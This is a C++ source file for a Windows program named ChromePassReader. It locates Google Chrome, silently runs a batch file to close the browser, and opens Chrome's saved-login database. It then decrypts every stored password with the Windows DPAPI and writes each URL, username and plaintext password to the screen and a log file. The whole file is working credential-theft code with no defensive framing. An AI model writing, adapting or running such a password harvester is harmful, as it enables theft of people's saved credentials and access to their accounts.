// ChromePassReader.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include "shlobj.h"
#include "sqlite3.h"
#include <shlwapi.h>

#pragma comment(lib, "sqlite3")
#pragma comment(lib, "crypt32")
#pragma comment(lib,"shlwapi.lib")

#define CRYPT_BUFFER_SIZE 1024

using namespace std;

bool readRegistryValue(const char* subkey, const char* key, char(&value)[MAX_PATH]) {
	HKEY hkey;
	DWORD dw = MAX_PATH;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &hkey) != ERROR_SUCCESS)
		return false;

	RegQueryValueEx(hkey, key, 0, 0, (BYTE*)value, &dw);

	RegCloseKey(hkey);

	return true;
}

void decrypt(BYTE* f_in, char(&f_out)[CRYPT_BUFFER_SIZE]) {
	DATA_BLOB db_in;
	DATA_BLOB db_out;

	db_in.pbData = f_in;
	db_in.cbData = CRYPT_BUFFER_SIZE + 1;

	if (CryptUnprotectData(&db_in, NULL, NULL, NULL, NULL, 0, &db_out)) {
		for (int i = 0; i < db_out.cbData; i++)
			f_out[i] = db_out.pbData[i];
	}
}

int main() {
	const char* reg_subkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe";
	const char* reg_key = "Path";
	char reg_value[MAX_PATH];
	FILE* file;
	errno_t errFile;

	errFile = fopen_s(&file, "chrome.log", "w");

	if (errFile == 0) {
		if (readRegistryValue(reg_subkey, reg_key, reg_value)) {
			sqlite3_stmt* stmt;
			sqlite3* db;
			const char* query = "SELECT origin_url, username_value, password_value FROM logins";
			TCHAR local_path[MAX_PATH];

			printf("Application path: %s\n", reg_value);

			fprintf(file, "[Google Chrome]\n\n");
			fprintf(file, "Application path: %s\n", reg_value);

			if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_path))) {
				PathAppend(local_path, TEXT("\\Google\\Chrome\\User Data\\Default\\Login Data"));

				printf("Local Application Data path: %s\n\n", local_path);

				fprintf(file, "Local Application Data path: %s\n\n", local_path);

				printf("*** Terminating Google Chrome...\n");

				ShellExecute(NULL, "open", "kill.bat", NULL, 0, SW_HIDE);

				Sleep(2000);

				if (sqlite3_open(local_path, &db) == SQLITE_OK) {
					if (sqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {
						printf("*** Starting...\n");

						while (sqlite3_step(stmt) == SQLITE_ROW) {
							char* url = (char*)sqlite3_column_text(stmt, 0);
							char* username = (char*)sqlite3_column_text(stmt, 1);
							char passwd[CRYPT_BUFFER_SIZE] = "";

							decrypt((BYTE*)sqlite3_column_text(stmt, 2), passwd);

							printf("URL: %s\n---------------------\nlogin: %s\npassword: %s\n---------------------\n\n", url, username, passwd);

							fprintf(file, "URL: %s\n---------------------\nlogin: %s\npassword: %s\n---------------------\n\n", url, username, passwd);
						}

						printf("*** Finished.\n");
					}
					else {
						printf("*** Database is in use by Google Chrome. You must close Google Chrome.\n");
					}

					sqlite3_finalize(stmt);
					sqlite3_close(db);
				}
				else {
					printf("*** Error opening database.\n");
				}
			}
			else {
				printf("*** Local Application Data path doesn't found.\n");
			}
		}
		else {
			printf("*** The reg key doesn't found.\n");
		}

		fclose(file);
	}
	else {
		printf("*** Can't open file for writing log file.\n");
	}

	getchar();
}